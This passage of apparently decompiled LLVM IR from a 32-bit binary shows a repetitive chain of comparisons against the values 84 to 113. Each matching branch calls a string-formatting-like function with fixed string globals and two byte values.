  %v0_804b23b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b23b = zext i8 %v0_804b23b to i32
  %v2_804b24a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b24a, i32* @ebx, align 4
  %v5_804b25c = call i32 @function_8048c55(i32 %v2_804b24a, i32 ptrtoint ([13 x i8]* @global_var_805ae21.126 to i32), i32 %v1_804b23b, i32 %v1_804b231)
  br label %dec_label_pc_804b261

dec_label_pc_804b261:                             ; preds = %dec_label_pc_804b22b, %dec_label_pc_804b231
  %v13_804b261 = icmp eq i32 %v2_804a0a2, 84
  %v1_804b265 = icmp eq i1 %v13_804b261, false
  br i1 %v1_804b265, label %dec_label_pc_804b297, label %dec_label_pc_804b267

dec_label_pc_804b267:                             ; preds = %dec_label_pc_804b261
  %v0_804b267 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b267 = zext i8 %v0_804b267 to i32
  store i32 %v1_804b267, i32* @edx, align 4
  %v0_804b271 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b271 = zext i8 %v0_804b271 to i32
  %v2_804b280 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b280, i32* @ebx, align 4
  %v5_804b292 = call i32 @function_8048c55(i32 %v2_804b280, i32 ptrtoint ([14 x i8]* @global_var_805ae2e.127 to i32), i32 %v1_804b271, i32 %v1_804b267)
  br label %dec_label_pc_804b297

dec_label_pc_804b297:                             ; preds = %dec_label_pc_804b261, %dec_label_pc_804b267
  %v13_804b297 = icmp eq i32 %v2_804a0a2, 85
  %v1_804b29b = icmp eq i1 %v13_804b297, false
  br i1 %v1_804b29b, label %dec_label_pc_804b2cd, label %dec_label_pc_804b29d

dec_label_pc_804b29d:                             ; preds = %dec_label_pc_804b297
  %v0_804b29d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b29d = zext i8 %v0_804b29d to i32
  store i32 %v1_804b29d, i32* @edx, align 4
  %v0_804b2a7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b2a7 = zext i8 %v0_804b2a7 to i32
  %v2_804b2b6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2b6, i32* @ebx, align 4
  %v5_804b2c8 = call i32 @function_8048c55(i32 %v2_804b2b6, i32 ptrtoint ([11 x i8]* @global_var_805ae3c.128 to i32), i32 %v1_804b2a7, i32 %v1_804b29d)
  br label %dec_label_pc_804b2cd

dec_label_pc_804b2cd:                             ; preds = %dec_label_pc_804b297, %dec_label_pc_804b29d
  %v13_804b2cd = icmp eq i32 %v2_804a0a2, 86
  %v1_804b2d1 = icmp eq i1 %v13_804b2cd, false
  br i1 %v1_804b2d1, label %dec_label_pc_804b303, label %dec_label_pc_804b2d3

dec_label_pc_804b2d3:                             ; preds = %dec_label_pc_804b2cd
  %v0_804b2d3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b2d3 = zext i8 %v0_804b2d3 to i32
  store i32 %v1_804b2d3, i32* @edx, align 4
  %v0_804b2dd = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b2dd = zext i8 %v0_804b2dd to i32
  %v2_804b2ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ec, i32* @ebx, align 4
  %v5_804b2fe = call i32 @function_8048c55(i32 %v2_804b2ec, i32 ptrtoint ([13 x i8]* @global_var_805ae47.129 to i32), i32 %v1_804b2dd, i32 %v1_804b2d3)
  br label %dec_label_pc_804b303

dec_label_pc_804b303:                             ; preds = %dec_label_pc_804b2cd, %dec_label_pc_804b2d3
  %v13_804b303 = icmp eq i32 %v2_804a0a2, 87
  %v1_804b307 = icmp eq i1 %v13_804b303, false
  br i1 %v1_804b307, label %dec_label_pc_804b339, label %dec_label_pc_804b309

dec_label_pc_804b309:                             ; preds = %dec_label_pc_804b303
  %v0_804b309 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b309 = zext i8 %v0_804b309 to i32
  store i32 %v1_804b309, i32* @edx, align 4
  %v0_804b313 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b313 = zext i8 %v0_804b313 to i32
  %v2_804b322 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b322, i32* @ebx, align 4
  %v5_804b334 = call i32 @function_8048c55(i32 %v2_804b322, i32 ptrtoint ([13 x i8]* @global_var_805ae54.130 to i32), i32 %v1_804b313, i32 %v1_804b309)
  br label %dec_label_pc_804b339

dec_label_pc_804b339:                             ; preds = %dec_label_pc_804b303, %dec_label_pc_804b309
  %v13_804b339 = icmp eq i32 %v2_804a0a2, 88
  %v1_804b33d = icmp eq i1 %v13_804b339, false
  br i1 %v1_804b33d, label %dec_label_pc_804b36f, label %dec_label_pc_804b33f

dec_label_pc_804b33f:                             ; preds = %dec_label_pc_804b339
  %v0_804b33f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b33f = zext i8 %v0_804b33f to i32
  store i32 %v1_804b33f, i32* @edx, align 4
  %v0_804b349 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b349 = zext i8 %v0_804b349 to i32
  %v2_804b358 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b358, i32* @ebx, align 4
  %v5_804b36a = call i32 @function_8048c55(i32 %v2_804b358, i32 ptrtoint ([13 x i8]* @global_var_805ae61.131 to i32), i32 %v1_804b349, i32 %v1_804b33f)
  br label %dec_label_pc_804b36f

dec_label_pc_804b36f:                             ; preds = %dec_label_pc_804b339, %dec_label_pc_804b33f
  %v13_804b36f = icmp eq i32 %v2_804a0a2, 89
  %v1_804b373 = icmp eq i1 %v13_804b36f, false
  br i1 %v1_804b373, label %dec_label_pc_804b3a5, label %dec_label_pc_804b375

dec_label_pc_804b375:                             ; preds = %dec_label_pc_804b36f
  %v0_804b375 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b375 = zext i8 %v0_804b375 to i32
  store i32 %v1_804b375, i32* @edx, align 4
  %v0_804b37f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b37f = zext i8 %v0_804b37f to i32
  %v2_804b38e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b38e, i32* @ebx, align 4
  %v5_804b3a0 = call i32 @function_8048c55(i32 %v2_804b38e, i32 ptrtoint ([13 x i8]* @global_var_805ae6e.132 to i32), i32 %v1_804b37f, i32 %v1_804b375)
  br label %dec_label_pc_804b3a5

dec_label_pc_804b3a5:                             ; preds = %dec_label_pc_804b36f, %dec_label_pc_804b375
  %v13_804b3a5 = icmp eq i32 %v2_804a0a2, 90
  %v1_804b3a9 = icmp eq i1 %v13_804b3a5, false
  br i1 %v1_804b3a9, label %dec_label_pc_804b3db, label %dec_label_pc_804b3ab

dec_label_pc_804b3ab:                             ; preds = %dec_label_pc_804b3a5
  %v0_804b3ab = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b3ab = zext i8 %v0_804b3ab to i32
  store i32 %v1_804b3ab, i32* @edx, align 4
  %v0_804b3b5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b3b5 = zext i8 %v0_804b3b5 to i32
  %v2_804b3c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3c4, i32* @ebx, align 4
  %v5_804b3d6 = call i32 @function_8048c55(i32 %v2_804b3c4, i32 ptrtoint ([11 x i8]* @global_var_805ae7b.133 to i32), i32 %v1_804b3b5, i32 %v1_804b3ab)
  br label %dec_label_pc_804b3db

dec_label_pc_804b3db:                             ; preds = %dec_label_pc_804b3a5, %dec_label_pc_804b3ab
  %v13_804b3db = icmp eq i32 %v2_804a0a2, 91
  %v1_804b3df = icmp eq i1 %v13_804b3db, false
  br i1 %v1_804b3df, label %dec_label_pc_804b411, label %dec_label_pc_804b3e1

dec_label_pc_804b3e1:                             ; preds = %dec_label_pc_804b3db
  %v0_804b3e1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b3e1 = zext i8 %v0_804b3e1 to i32
  store i32 %v1_804b3e1, i32* @edx, align 4
  %v0_804b3eb = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b3eb = zext i8 %v0_804b3eb to i32
  %v2_804b3fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3fa, i32* @ebx, align 4
  %v5_804b40c = call i32 @function_8048c55(i32 %v2_804b3fa, i32 ptrtoint ([12 x i8]* @global_var_805ae86.134 to i32), i32 %v1_804b3eb, i32 %v1_804b3e1)
  br label %dec_label_pc_804b411

dec_label_pc_804b411:                             ; preds = %dec_label_pc_804b3db, %dec_label_pc_804b3e1
  %v13_804b411 = icmp eq i32 %v2_804a0a2, 92
  %v1_804b415 = icmp eq i1 %v13_804b411, false
  br i1 %v1_804b415, label %dec_label_pc_804b447, label %dec_label_pc_804b417

dec_label_pc_804b417:                             ; preds = %dec_label_pc_804b411
  %v0_804b417 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b417 = zext i8 %v0_804b417 to i32
  store i32 %v1_804b417, i32* @edx, align 4
  %v0_804b421 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b421 = zext i8 %v0_804b421 to i32
  %v2_804b430 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b430, i32* @ebx, align 4
  %v5_804b442 = call i32 @function_8048c55(i32 %v2_804b430, i32 ptrtoint ([13 x i8]* @global_var_805ae92.135 to i32), i32 %v1_804b421, i32 %v1_804b417)
  br label %dec_label_pc_804b447

dec_label_pc_804b447:                             ; preds = %dec_label_pc_804b411, %dec_label_pc_804b417
  %v13_804b447 = icmp eq i32 %v2_804a0a2, 93
  %v1_804b44b = icmp eq i1 %v13_804b447, false
  br i1 %v1_804b44b, label %dec_label_pc_804b47d, label %dec_label_pc_804b44d

dec_label_pc_804b44d:                             ; preds = %dec_label_pc_804b447
  %v0_804b44d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b44d = zext i8 %v0_804b44d to i32
  store i32 %v1_804b44d, i32* @edx, align 4
  %v0_804b457 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b457 = zext i8 %v0_804b457 to i32
  %v2_804b466 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b466, i32* @ebx, align 4
  %v5_804b478 = call i32 @function_8048c55(i32 %v2_804b466, i32 ptrtoint ([12 x i8]* @global_var_805ae9f.136 to i32), i32 %v1_804b457, i32 %v1_804b44d)
  br label %dec_label_pc_804b47d

dec_label_pc_804b47d:                             ; preds = %dec_label_pc_804b447, %dec_label_pc_804b44d
  %v13_804b47d = icmp eq i32 %v2_804a0a2, 94
  %v1_804b481 = icmp eq i1 %v13_804b47d, false
  br i1 %v1_804b481, label %dec_label_pc_804b4b3, label %dec_label_pc_804b483

dec_label_pc_804b483:                             ; preds = %dec_label_pc_804b47d
  %v0_804b483 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b483 = zext i8 %v0_804b483 to i32
  store i32 %v1_804b483, i32* @edx, align 4
  %v0_804b48d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b48d = zext i8 %v0_804b48d to i32
  %v2_804b49c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b49c, i32* @ebx, align 4
  %v5_804b4ae = call i32 @function_8048c55(i32 %v2_804b49c, i32 ptrtoint ([13 x i8]* @global_var_805aeab.137 to i32), i32 %v1_804b48d, i32 %v1_804b483)
  br label %dec_label_pc_804b4b3

dec_label_pc_804b4b3:                             ; preds = %dec_label_pc_804b47d, %dec_label_pc_804b483
  %v13_804b4b3 = icmp eq i32 %v2_804a0a2, 95
  %v1_804b4b7 = icmp eq i1 %v13_804b4b3, false
  br i1 %v1_804b4b7, label %dec_label_pc_804b4e9, label %dec_label_pc_804b4b9

dec_label_pc_804b4b9:                             ; preds = %dec_label_pc_804b4b3
  %v0_804b4b9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b4b9 = zext i8 %v0_804b4b9 to i32
  store i32 %v1_804b4b9, i32* @edx, align 4
  %v0_804b4c3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b4c3 = zext i8 %v0_804b4c3 to i32
  %v2_804b4d2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4d2, i32* @ebx, align 4
  %v5_804b4e4 = call i32 @function_8048c55(i32 %v2_804b4d2, i32 ptrtoint ([12 x i8]* @global_var_805aeb8.138 to i32), i32 %v1_804b4c3, i32 %v1_804b4b9)
  br label %dec_label_pc_804b4e9

dec_label_pc_804b4e9:                             ; preds = %dec_label_pc_804b4b3, %dec_label_pc_804b4b9
  %v10_804b4e9 = icmp eq i32 %v2_804a0a2, 96
  %v1_804b4ed = icmp eq i1 %v10_804b4e9, false
  br i1 %v1_804b4ed, label %dec_label_pc_804b51f, label %dec_label_pc_804b4ef

dec_label_pc_804b4ef:                             ; preds = %dec_label_pc_804b4e9
  %v0_804b4ef = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b4ef = zext i8 %v0_804b4ef to i32
  store i32 %v1_804b4ef, i32* @edx, align 4
  %v0_804b4f9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b4f9 = zext i8 %v0_804b4f9 to i32
  %v2_804b508 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b508, i32* @ebx, align 4
  %v5_804b51a = call i32 @function_8048c55(i32 %v2_804b508, i32 ptrtoint ([11 x i8]* @global_var_805aec4.139 to i32), i32 %v1_804b4f9, i32 %v1_804b4ef)
  br label %dec_label_pc_804b51f

dec_label_pc_804b51f:                             ; preds = %dec_label_pc_804b4e9, %dec_label_pc_804b4ef
  %v13_804b51f = icmp eq i32 %v2_804a0a2, 97
  %v1_804b523 = icmp eq i1 %v13_804b51f, false
  br i1 %v1_804b523, label %dec_label_pc_804b555, label %dec_label_pc_804b525

dec_label_pc_804b525:                             ; preds = %dec_label_pc_804b51f
  %v0_804b525 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b525 = zext i8 %v0_804b525 to i32
  store i32 %v1_804b525, i32* @edx, align 4
  %v0_804b52f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b52f = zext i8 %v0_804b52f to i32
  %v2_804b53e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b53e, i32* @ebx, align 4
  %v5_804b550 = call i32 @function_8048c55(i32 %v2_804b53e, i32 ptrtoint ([12 x i8]* @global_var_805aecf.140 to i32), i32 %v1_804b52f, i32 %v1_804b525)
  br label %dec_label_pc_804b555

dec_label_pc_804b555:                             ; preds = %dec_label_pc_804b51f, %dec_label_pc_804b525
  %v13_804b555 = icmp eq i32 %v2_804a0a2, 98
  %v1_804b559 = icmp eq i1 %v13_804b555, false
  br i1 %v1_804b559, label %dec_label_pc_804b58b, label %dec_label_pc_804b55b

dec_label_pc_804b55b:                             ; preds = %dec_label_pc_804b555
  %v0_804b55b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b55b = zext i8 %v0_804b55b to i32
  store i32 %v1_804b55b, i32* @edx, align 4
  %v0_804b565 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b565 = zext i8 %v0_804b565 to i32
  %v2_804b574 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b574, i32* @ebx, align 4
  %v5_804b586 = call i32 @function_8048c55(i32 %v2_804b574, i32 ptrtoint ([12 x i8]* @global_var_805aedb.141 to i32), i32 %v1_804b565, i32 %v1_804b55b)
  br label %dec_label_pc_804b58b

dec_label_pc_804b58b:                             ; preds = %dec_label_pc_804b555, %dec_label_pc_804b55b
  %v13_804b58b = icmp eq i32 %v2_804a0a2, 99
  %v1_804b58f = icmp eq i1 %v13_804b58b, false
  br i1 %v1_804b58f, label %dec_label_pc_804b5c1, label %dec_label_pc_804b591

dec_label_pc_804b591:                             ; preds = %dec_label_pc_804b58b
  %v0_804b591 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b591 = zext i8 %v0_804b591 to i32
  store i32 %v1_804b591, i32* @edx, align 4
  %v0_804b59b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b59b = zext i8 %v0_804b59b to i32
  %v2_804b5aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5aa, i32* @ebx, align 4
  %v5_804b5bc = call i32 @function_8048c55(i32 %v2_804b5aa, i32 ptrtoint ([12 x i8]* @global_var_805aee7.142 to i32), i32 %v1_804b59b, i32 %v1_804b591)
  br label %dec_label_pc_804b5c1

dec_label_pc_804b5c1:                             ; preds = %dec_label_pc_804b58b, %dec_label_pc_804b591
  %v13_804b5c1 = icmp eq i32 %v2_804a0a2, 100
  %v1_804b5c5 = icmp eq i1 %v13_804b5c1, false
  br i1 %v1_804b5c5, label %dec_label_pc_804b5f7, label %dec_label_pc_804b5c7

dec_label_pc_804b5c7:                             ; preds = %dec_label_pc_804b5c1
  %v0_804b5c7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b5c7 = zext i8 %v0_804b5c7 to i32
  store i32 %v1_804b5c7, i32* @edx, align 4
  %v0_804b5d1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b5d1 = zext i8 %v0_804b5d1 to i32
  %v2_804b5e0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5e0, i32* @ebx, align 4
  %v5_804b5f2 = call i32 @function_8048c55(i32 %v2_804b5e0, i32 ptrtoint ([12 x i8]* @global_var_805aef3.143 to i32), i32 %v1_804b5d1, i32 %v1_804b5c7)
  br label %dec_label_pc_804b5f7

dec_label_pc_804b5f7:                             ; preds = %dec_label_pc_804b5c1, %dec_label_pc_804b5c7
  %v13_804b5f7 = icmp eq i32 %v2_804a0a2, 101
  %v1_804b5fb = icmp eq i1 %v13_804b5f7, false
  br i1 %v1_804b5fb, label %dec_label_pc_804b62d, label %dec_label_pc_804b5fd

dec_label_pc_804b5fd:                             ; preds = %dec_label_pc_804b5f7
  %v0_804b5fd = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b5fd = zext i8 %v0_804b5fd to i32
  store i32 %v1_804b5fd, i32* @edx, align 4
  %v0_804b607 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b607 = zext i8 %v0_804b607 to i32
  %v2_804b616 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b616, i32* @ebx, align 4
  %v5_804b628 = call i32 @function_8048c55(i32 %v2_804b616, i32 ptrtoint ([12 x i8]* @global_var_805aeff.144 to i32), i32 %v1_804b607, i32 %v1_804b5fd)
  br label %dec_label_pc_804b62d

dec_label_pc_804b62d:                             ; preds = %dec_label_pc_804b5f7, %dec_label_pc_804b5fd
  %v13_804b62d = icmp eq i32 %v2_804a0a2, 102
  %v1_804b631 = icmp eq i1 %v13_804b62d, false
  br i1 %v1_804b631, label %dec_label_pc_804b663, label %dec_label_pc_804b633

dec_label_pc_804b633:                             ; preds = %dec_label_pc_804b62d
  %v0_804b633 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b633 = zext i8 %v0_804b633 to i32
  store i32 %v1_804b633, i32* @edx, align 4
  %v0_804b63d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b63d = zext i8 %v0_804b63d to i32
  %v2_804b64c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b64c, i32* @ebx, align 4
  %v5_804b65e = call i32 @function_8048c55(i32 %v2_804b64c, i32 ptrtoint ([13 x i8]* @global_var_805af0b.145 to i32), i32 %v1_804b63d, i32 %v1_804b633)
  br label %dec_label_pc_804b663

dec_label_pc_804b663:                             ; preds = %dec_label_pc_804b62d, %dec_label_pc_804b633
  %v13_804b663 = icmp eq i32 %v2_804a0a2, 103
  %v1_804b667 = icmp eq i1 %v13_804b663, false
  br i1 %v1_804b667, label %dec_label_pc_804b699, label %dec_label_pc_804b669

dec_label_pc_804b669:                             ; preds = %dec_label_pc_804b663
  %v0_804b669 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b669 = zext i8 %v0_804b669 to i32
  store i32 %v1_804b669, i32* @edx, align 4
  %v0_804b673 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b673 = zext i8 %v0_804b673 to i32
  %v2_804b682 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b682, i32* @ebx, align 4
  %v5_804b694 = call i32 @function_8048c55(i32 %v2_804b682, i32 ptrtoint ([13 x i8]* @global_var_805af18.146 to i32), i32 %v1_804b673, i32 %v1_804b669)
  br label %dec_label_pc_804b699

dec_label_pc_804b699:                             ; preds = %dec_label_pc_804b663, %dec_label_pc_804b669
  %v13_804b699 = icmp eq i32 %v2_804a0a2, 104
  %v1_804b69d = icmp eq i1 %v13_804b699, false
  br i1 %v1_804b69d, label %dec_label_pc_804b6cf, label %dec_label_pc_804b69f

dec_label_pc_804b69f:                             ; preds = %dec_label_pc_804b699
  %v0_804b69f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b69f = zext i8 %v0_804b69f to i32
  store i32 %v1_804b69f, i32* @edx, align 4
  %v0_804b6a9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b6a9 = zext i8 %v0_804b6a9 to i32
  %v2_804b6b8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6b8, i32* @ebx, align 4
  %v5_804b6ca = call i32 @function_8048c55(i32 %v2_804b6b8, i32 ptrtoint ([13 x i8]* @global_var_805af25.147 to i32), i32 %v1_804b6a9, i32 %v1_804b69f)
  br label %dec_label_pc_804b6cf

dec_label_pc_804b6cf:                             ; preds = %dec_label_pc_804b699, %dec_label_pc_804b69f
  %v13_804b6cf = icmp eq i32 %v2_804a0a2, 105
  %v1_804b6d3 = icmp eq i1 %v13_804b6cf, false
  br i1 %v1_804b6d3, label %dec_label_pc_804b705, label %dec_label_pc_804b6d5

dec_label_pc_804b6d5:                             ; preds = %dec_label_pc_804b6cf
  %v0_804b6d5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b6d5 = zext i8 %v0_804b6d5 to i32
  store i32 %v1_804b6d5, i32* @edx, align 4
  %v0_804b6df = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b6df = zext i8 %v0_804b6df to i32
  %v2_804b6ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6ee, i32* @ebx, align 4
  %v5_804b700 = call i32 @function_8048c55(i32 %v2_804b6ee, i32 ptrtoint ([13 x i8]* @global_var_805af32.148 to i32), i32 %v1_804b6df, i32 %v1_804b6d5)
  br label %dec_label_pc_804b705

dec_label_pc_804b705:                             ; preds = %dec_label_pc_804b6cf, %dec_label_pc_804b6d5
  %v13_804b705 = icmp eq i32 %v2_804a0a2, 106
  %v1_804b709 = icmp eq i1 %v13_804b705, false
  br i1 %v1_804b709, label %dec_label_pc_804b73b, label %dec_label_pc_804b70b

dec_label_pc_804b70b:                             ; preds = %dec_label_pc_804b705
  %v0_804b70b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b70b = zext i8 %v0_804b70b to i32
  store i32 %v1_804b70b, i32* @edx, align 4
  %v0_804b715 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b715 = zext i8 %v0_804b715 to i32
  %v2_804b724 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b724, i32* @ebx, align 4
  %v5_804b736 = call i32 @function_8048c55(i32 %v2_804b724, i32 ptrtoint ([13 x i8]* @global_var_805af3f.149 to i32), i32 %v1_804b715, i32 %v1_804b70b)
  br label %dec_label_pc_804b73b

dec_label_pc_804b73b:                             ; preds = %dec_label_pc_804b705, %dec_label_pc_804b70b
  %v13_804b73b = icmp eq i32 %v2_804a0a2, 107
  %v1_804b73f = icmp eq i1 %v13_804b73b, false
  br i1 %v1_804b73f, label %dec_label_pc_804b771, label %dec_label_pc_804b741

dec_label_pc_804b741:                             ; preds = %dec_label_pc_804b73b
  %v0_804b741 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b741 = zext i8 %v0_804b741 to i32
  store i32 %v1_804b741, i32* @edx, align 4
  %v0_804b74b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b74b = zext i8 %v0_804b74b to i32
  %v2_804b75a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b75a, i32* @ebx, align 4
  %v5_804b76c = call i32 @function_8048c55(i32 %v2_804b75a, i32 ptrtoint ([13 x i8]* @global_var_805af4c.150 to i32), i32 %v1_804b74b, i32 %v1_804b741)
  br label %dec_label_pc_804b771

dec_label_pc_804b771:                             ; preds = %dec_label_pc_804b73b, %dec_label_pc_804b741
  %v13_804b771 = icmp eq i32 %v2_804a0a2, 108
  %v1_804b775 = icmp eq i1 %v13_804b771, false
  br i1 %v1_804b775, label %dec_label_pc_804b7a7, label %dec_label_pc_804b777

dec_label_pc_804b777:                             ; preds = %dec_label_pc_804b771
  %v0_804b777 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b777 = zext i8 %v0_804b777 to i32
  store i32 %v1_804b777, i32* @edx, align 4
  %v0_804b781 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b781 = zext i8 %v0_804b781 to i32
  %v2_804b790 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b790, i32* @ebx, align 4
  %v5_804b7a2 = call i32 @function_8048c55(i32 %v2_804b790, i32 ptrtoint ([13 x i8]* @global_var_805af59.151 to i32), i32 %v1_804b781, i32 %v1_804b777)
  br label %dec_label_pc_804b7a7

dec_label_pc_804b7a7:                             ; preds = %dec_label_pc_804b771, %dec_label_pc_804b777
  %v13_804b7a7 = icmp eq i32 %v2_804a0a2, 109
  %v1_804b7ab = icmp eq i1 %v13_804b7a7, false
  br i1 %v1_804b7ab, label %dec_label_pc_804b7dd, label %dec_label_pc_804b7ad

dec_label_pc_804b7ad:                             ; preds = %dec_label_pc_804b7a7
  %v0_804b7ad = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b7ad = zext i8 %v0_804b7ad to i32
  store i32 %v1_804b7ad, i32* @edx, align 4
  %v0_804b7b7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b7b7 = zext i8 %v0_804b7b7 to i32
  %v2_804b7c6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7c6, i32* @ebx, align 4
  %v5_804b7d8 = call i32 @function_8048c55(i32 %v2_804b7c6, i32 ptrtoint ([13 x i8]* @global_var_805af66.152 to i32), i32 %v1_804b7b7, i32 %v1_804b7ad)
  br label %dec_label_pc_804b7dd

dec_label_pc_804b7dd:                             ; preds = %dec_label_pc_804b7a7, %dec_label_pc_804b7ad
  %v13_804b7dd = icmp eq i32 %v2_804a0a2, 110
  %v1_804b7e1 = icmp eq i1 %v13_804b7dd, false
  br i1 %v1_804b7e1, label %dec_label_pc_804b813, label %dec_label_pc_804b7e3

dec_label_pc_804b7e3:                             ; preds = %dec_label_pc_804b7dd
  %v0_804b7e3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b7e3 = zext i8 %v0_804b7e3 to i32
  store i32 %v1_804b7e3, i32* @edx, align 4
  %v0_804b7ed = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b7ed = zext i8 %v0_804b7ed to i32
  %v2_804b7fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7fc, i32* @ebx, align 4
  %v5_804b80e = call i32 @function_8048c55(i32 %v2_804b7fc, i32 ptrtoint ([12 x i8]* @global_var_805af73.153 to i32), i32 %v1_804b7ed, i32 %v1_804b7e3)
  br label %dec_label_pc_804b813

dec_label_pc_804b813:                             ; preds = %dec_label_pc_804b7dd, %dec_label_pc_804b7e3
  %v13_804b813 = icmp eq i32 %v2_804a0a2, 111
  %v1_804b817 = icmp eq i1 %v13_804b813, false
  br i1 %v1_804b817, label %dec_label_pc_804b849, label %dec_label_pc_804b819

dec_label_pc_804b819:                             ; preds = %dec_label_pc_804b813
  %v0_804b819 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b819 = zext i8 %v0_804b819 to i32
  store i32 %v1_804b819, i32* @edx, align 4
  %v0_804b823 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b823 = zext i8 %v0_804b823 to i32
  %v2_804b832 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b832, i32* @ebx, align 4
  %v5_804b844 = call i32 @function_8048c55(i32 %v2_804b832, i32 ptrtoint ([12 x i8]* @global_var_805af7f.154 to i32), i32 %v1_804b823, i32 %v1_804b819)
  br label %dec_label_pc_804b849

dec_label_pc_804b849:                             ; preds = %dec_label_pc_804b813, %dec_label_pc_804b819
  %v10_804b849 = icmp eq i32 %v2_804a0a2, 112
  %v1_804b84d = icmp eq i1 %v10_804b849, false
  br i1 %v1_804b84d, label %dec_label_pc_804b87f, label %dec_label_pc_804b84f

dec_label_pc_804b84f:                             ; preds = %dec_label_pc_804b849
  %v0_804b84f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b84f = zext i8 %v0_804b84f to i32
  store i32 %v1_804b84f, i32* @edx, align 4
  %v0_804b859 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b859 = zext i8 %v0_804b859 to i32
  %v2_804b868 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b868, i32* @ebx, align 4
  %v5_804b87a = call i32 @function_8048c55(i32 %v2_804b868, i32 ptrtoint ([12 x i8]* @global_var_805af8b.155 to i32), i32 %v1_804b859, i32 %v1_804b84f)
  br label %dec_label_pc_804b87f

dec_label_pc_804b87f:                             ; preds = %dec_label_pc_804b849, %dec_label_pc_804b84f
  %v13_804b87f = icmp eq i32 %v2_804a0a2, 113
  %v1_804b883 = icmp eq i1 %v13_804b87f, false
  br i1 %v1_804b883, label %dec_label_pc_804b8b5, label %dec_label_pc_804b885

